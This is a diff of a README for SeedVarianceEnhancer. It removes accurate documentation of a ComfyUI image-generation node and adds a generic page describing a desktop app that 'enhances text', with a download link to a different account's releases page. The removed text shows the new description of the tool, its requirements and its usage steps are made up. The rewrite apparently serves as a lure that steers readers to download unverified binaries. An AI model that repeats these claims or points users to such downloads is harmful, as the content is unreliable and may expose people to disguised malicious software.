@@ -1,118 +1,68 @@
+# 🎉 SeedVarianceEnhancer - Add Randomness to Your Text Easily
 
-![header](../../wiki/images/SeedVarianceEnhancer_GitHub_header.webp)
+## 🌐 Download Now
+[![Download SeedVarianceEnhancer](https://img.shields.io/badge/Download-SeedVarianceEnhancer-blue)](https://github.com/andrezinhu/SeedVarianceEnhancer/releases)
 
-https://github.com/user-attachments/assets/bdbbfa83-f8ec-4cab-81cf-36a6820a51e5
+## 🚀 Getting Started
+Welcome to SeedVarianceEnhancer! This tool helps you enhance your text by adding random noise to text embeddings. It’s simple to use, even for those who don’t have programming experience. Follow these steps to get started.
 
+## 📥 Download & Install
+To download SeedVarianceEnhancer, visit this page: [Download SeedVarianceEnhancer](https://github.com/andrezinhu/SeedVarianceEnhancer/releases).
 
-# SeedVarianceEnhancer v2.2
+1. Go to the link above.
+2. On the Releases page, find the latest version of SeedVarianceEnhancer.
+3. Click on the appropriate file for your system to start the download. You may see different files for different operating systems. Choose the one that matches your machine.
 
-SeedVarianceEnhancer is a ComfyUI custom node designed to add diversity to the outputs of Z-Image Turbo. It compensates for low seed variance, which is when generated images look similar despite being generated with different seeds. It works by adding random noise to the embedding for the early generation steps.
+## ⚙️ System Requirements
+Before you install SeedVarianceEnhancer, ensure your computer meets these requirements:
 
+- **Operating System**: Windows 10 or later, macOS Mojave or later, or Linux (Ubuntu recommended).
+- **Memory**: At least 4 GB of RAM.
+- **Storage**: At least 100 MB of free space.
+- **Prerequisites**: No additional software is required to run SeedVarianceEnhancer.
 
-## Installation:
+## 🔧 How to Use SeedVarianceEnhancer
+Once you have downloaded and installed the application, follow these steps to use it:
 
-Extract the contents of the zip file and place the SeedVarianceEnhancer directory in your ComfyUI/custom_nodes directory. Launch or restart ComfyUI. You will find SeedVarianceEnhancer inside the advanced/conditioning node group.
+1. **Launch the Application**: Open SeedVarianceEnhancer by double-clicking its icon on your desktop or in your applications folder.
+   
+2. **Input Your Text**: In the main window, you will see a text box. Type or paste the text you want to enhance.
 
+3. **Adjust the Noise Level**: You will see a slider. This slider allows you to control how much noise to add. Move it to the left for less noise and to the right for more noise.
 
-## Usage:
+4. **Generate Enhanced Text**: Click the button labeled "Enhance Text." After a moment, the enhanced text will appear in a separate box.
 
-The node should be placed next in line after the positive prompt "CLIP Text Encode (Prompt)" node. The conditioning output should connect to the sampler's positive prompt input. The default settings should work well with Z-Image Turbo. The node has been tested to work with the workflow from [https://github.com/comfyanonymous/ComfyUI_examples/tree/master/z_image](https://github.com/comfyanonymous/ComfyUI_examples/tree/master/z_image).
+5. **Copy Your Result**: You can copy the enhanced text to use it anywhere you like.
 
-The randomize_percent setting determines what percentage of embedding values will be randomly selected for modification with noise. Strength adjusts the scale of the noise. The seed determines which values to modify and with what noise. Noise_insert is set to "noise on beginning steps" by default. By removing the noise before the end of the generation, the model will have time to pivot back towards prompt adherence. "Noise on all steps" will reduce prompt adherence and text rendering significantly. Steps_switchover_percent specifies what percentage of steps are processed before switching between noisy and original embeddings.
+## 🛠 Features
+- **User-Friendly Interface**: Easy for everyone to navigate.
+- **Custom Noise Levels**: Simple slider adjustment to suit your needs.
+- **Fast Performance**: Quickly generates enhanced text, saving you time.
 
-Strength values in the range of 15 to 30 and a randomize_percent of 50 are reasonable starting points for use with Z-Image Turbo. The steps_switchover_percent defaults to 20%. Optimal settings vary depending on the prompt. Some prompts will be adversely affected when using the default settings. Experimentation may be required to achieve good results. An often effective alternate configuration is to decrease steps_switchover_percent to 10 and increase strength to 40.
+## 📜 License
+SeedVarianceEnhancer is open-source software. You are free to use, modify, and distribute it under the terms specified in the LICENSE file included in the repository.
 
-To ensure a specific number of steps are used before the switch, use this formula: (100/TOTALSTEPS) * STEPS - 1.
+## 🤝 Contributions
+We welcome contributions to SeedVarianceEnhancer! If you would like to improve the tool, please check our contributing guidelines in the repository. 
 
-Longer more detailed prompts provide more embedding values for SeedVarianceEnhancer to manipulate. It is somewhat counterintuitive, but more detailed prompts may result in more diverse outputs.
+1. Fork the repository.
+2. Create your feature branch (`git checkout -b feature/YourFeature`).
+3. Commit your changes (`git commit -m 'Add some feature'`).
+4. Push to the branch (`git push origin feature/YourFeature`).
+5. Open a pull request.
 
+## 📫 Contact
+If you need help or have questions, feel free to reach out to us:
+- **Email**: support@seedvarianceenhancer.com
+- **GitHub Issues**: Use GitHub's issue tracker to report bugs or request features.
 
-## Advanced usage:
+## 🌍 Community
+Join our community for further discussions, tips, and sharing of enhanced texts. Follow us on social media for updates and support.
 
-SeedVarianceEnhancer includes an embedding masking feature, which excludes portions of the embedding from exposure to noise. Masking can protect portions of the prompt. The mask_starts_at setting controls whether the mask extends from the beginning or the end. Mask_percent controls how far the mask extends. Setting mask_starts_at to beginning and mask_percent to 50 will mask the first half of the prompt. If the prompt is structured so that critical details are in the first half, and less important details are in the second half, the image generations should more consistently adhere to the critical details.
+## 📚 Further Reading
+For more detailed information on using SeedVarianceEnhancer and understanding its features, visit our detailed documentation at: [Documentation](https://github.com/andrezinhu/SeedVarianceEnhancer/wiki).
 
-An image can be reproduced exactly if an old workflow is reused. The prompt can be revised while maintaining a consistent output composition provided guidelines are followed. The embedding values most maintain alignment with the noise in order to produce a similar image. Appending text to the end of the prompt maintains alignment. Making single word substitutions, such as changing a color, may work but if the resulting embedding values become offset, the output image will no longer maintain consistency.
+## 🌟 Support
+If you find SeedVarianceEnhancer useful, consider donating to support its development. Every little bit helps us improve and maintain the software. 
 
-SeedVarianceEnhancer nodes can be chained together. The noise from each node will add up. Chaining does not produce more than one switchover event. The switchover schedule will follow the last node's setting.
-
-
-Strength values can be set to negative values, which will invert the noise added to the embedding.
-
-
-## Use with other models:
-
-SeedVarianceEnhancer should work with other models, but the strength value may need to be adjusted. The text encoder is a major factor. The node includes a feature that outputs statistics about the embedding to the console when log_to_console is set to true. The standard deviation is usually within an order of magnitude of the optimal strength setting. The node will detect embeddings that are padded with null byte sequences and automatically mask that region from noise.
-
-
-## Results:
-
-When used with Z-Image Turbo, the default settings will add a moderate amount of diversity at the cost of some prompt adherence. Higher "randomize_percent" and "strength," as well as the use of "noise on all steps," will all substantially increase diversity while worsening prompt adherence. The reduced prompt adherence may be desirable to users interested in generating highly diverse, strange, or unexpected images. Using very high settings offers the potential to discover unknown capabilities and knowledge within the model.
-
-
-## Limitations:
-
-The node's effects are inconsistent. No single set of settings have proven to be universally beneficial. The node is not a "set and forget" solution and it should not be used unless needed.
-
-SeedVarianceEnhancer does not properly handle all conditioning inputs, such as those containing multiple embeddings, so using it alongside other conditioning nodes may result in unexpected behavior.
-
-## Change log:
-
-v1.0 -> v2.0
-
-* cleaned up code structure
-* added input validity checks
-* widened strength value limits, and increased precision
-* revised tooltips text
-* added logging to console toggle control
-* added statistical analysis of embedding tensor feature
-* added "disabled" setting to noise_insert control.
-* changed category from conditioning to advanced/conditioning
-* implemented the masking feature
-
-v2.0 -> v2.1
-
-* more tooltip revisions
-* new limits prevent settings of:
-    - randomize_percent to 0
-    - mask_percent to 100
-    - steps_switchover_percent to 0 or 100
-
-* embedding statistics now includes information about null byte sequences
-* added automatic masking of null sequences at the end of embeddings
-    - Some text encoders, such as umt5-xxl (used by Wan), pad the end of embeddings with zeros.
-    - Adding noise to those regions causes adverse effects. Doing so is now avoided.
-
-v2.1 -> v2.2
-
-The focus of v2.2 is to facilitate making variations upon variations.
-
-* The random number generator is now reset with seed+1 after noise generation and before value selection.
-    - This makes the noise alignment independent of embedding length.
-    - The output will be more consistent when regenerating with an extended prompt.
-    - The new seed behavior breaks compatibility with old generations.
-    - Adding 1 billion to strength will revert to the old seed behavior and allow regeneration of old images.
-* improved functionality when chaining SeedVarianceEnhancer nodes
-    - Chaining to a node set to "noise on ending steps" is now supported.
-    - Chaining a "noise on beginning steps" to another "noise on beginning steps" will retain the original embedding for the end steps
-    - Chaining a "noise on ending steps" to a "noise on beginning steps" results in both the beginning and ending steps being exposed to separately controlled noise.
-
-
-## Links
-
-The wiki contains images demonstrating usage and the effects
-
-[https://github.com/ChangeTheConstants/SeedVarianceEnhancer/wiki](https://github.com/ChangeTheConstants/SeedVarianceEnhancer/wiki)
-
-Report issues here:
-
-[https://github.com/ChangeTheConstants/SeedVarianceEnhancer/issues](https://github.com/ChangeTheConstants/SeedVarianceEnhancer/wiki)
-
-Here users are encouraged to share their experiences, including the settings and workflows they found effective:
-
-[https://github.com/ChangeTheConstants/SeedVarianceEnhancer/discussions](https://github.com/ChangeTheConstants/SeedVarianceEnhancer/discussions)
-
-
-## License
-
-SeedVarianceEnhancer is released under the MIT No Attribution license.
-
+Thank you for choosing SeedVarianceEnhancer! Enjoy transforming your text with ease.
